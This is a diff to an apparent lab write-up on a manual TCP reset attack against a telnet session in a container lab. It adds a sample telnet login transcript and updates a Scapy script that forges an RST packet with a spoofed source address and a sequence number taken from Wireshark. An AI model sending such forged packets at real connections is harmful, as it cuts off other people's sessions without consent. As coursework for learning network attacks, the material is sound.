@@ -87,6 +87,19 @@ For this attack we used Wireshark to gather the requested information.
 
 We first authenticated ourselves on telnet and then we look at the last packet sent in the direction we want to RESET the connection (in this case from 10.9.0.6 to 10.9.0.5).
 
+```bash
+root@472341f5fb4b:/# telnet 10.9.0.5
+Trying 10.9.0.5...
+Connected to 10.9.0.5.
+Escape character is '^]'.
+Ubuntu 20.04.1 LTS
+abb6db62e897 login: seed
+Password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)
+```
+
+Tip: complete the login step to avoid incurring in a time out of the connection.
+
 We take the value shown in `sequence number (raw)` and set it as the sequence number in our script (we can do that because the last ACK hasn't any payload aka it's `=0`), together with the `R` flag.
 
 Let's put the right IPs and ports (again, watching Wireshark).
@@ -100,16 +113,14 @@ from scapy.all import *
 
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
 
-# Need to take the seq number (raw) corresponding to the one inside the last packet sent in that direction (in this case from 10.9.0.6 to 10.9.0.5)
-
-tcp = TCP(sport=32804, dport=23, flags="R", seq=2481792999)
+tcp = TCP(sport=58018, dport=23, flags="R", seq=4198450972)
 pkt = ip/tcp
 ls(pkt)
 send(pkt,verbose=0)
 ```
 
 Results:
-![Results](./volumes/images/Screenshot%20From%202026-10-10%2018-46-16.png)
+[Results]()
 
 ## Automatic
 
